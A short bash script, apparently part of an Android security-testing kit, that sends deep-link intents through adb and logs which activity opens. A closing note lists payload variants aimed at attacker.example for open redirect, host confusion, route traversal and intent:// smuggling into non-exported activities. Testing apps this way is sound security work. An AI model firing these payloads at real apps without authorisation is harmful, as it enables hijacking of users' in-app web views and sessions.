#!/usr/bin/env bash
# 07-deeplink-sweep.sh <pkg> <uris-file>
# Fire each URI as a BROWSABLE VIEW intent -- exactly what a web page can do.
# Any deep link that lands in a WebView with an attacker URL is the D09 -> D10 chain.
set -uo pipefail
PKG="${1:?usage: $0 <package> <uris-file>}"
FILE="${2:?usage: $0 <package> <uris-file>}"

printf '%-64s %s\n' "URI" "LANDED ON"
printf '%.0s-' {1..120}; echo
while read -r U; do
  [ -z "$U" ] && continue
  adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d "$U" >/dev/null 2>&1
  sleep 3
  T=$(adb shell dumpsys activity activities 2>/dev/null | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//')
  printf '%-64s %s\n' "$U" "$T"
done < "$FILE"

cat <<'NOTE'

BUILD THE URI FILE FROM THE MANIFEST, THEN MUTATE. Variants that pay:
  scheme://host/path?url=https://attacker.example/
  scheme://host/path?redirect_uri=https://attacker.example/
  scheme://host/path?next=//attacker.example
  scheme://host/path?url=https://trusted.example.attacker.example/   (suffix confusion)
  scheme://host/path?url=https://attacker.example%23@trusted.example/ (userinfo confusion)
  scheme://host/../../other/route                                    (router traversal)
  intent://host/#Intent;scheme=x;component=pkg/.NonExportedActivity;end   (intent:// smuggling)

REMEMBER: a deep link is AM-02 (remote, one click) -- the strongest mobile-native attacker model.
Prove it from a real HTML page, not just adb, before you report it.
NOTE
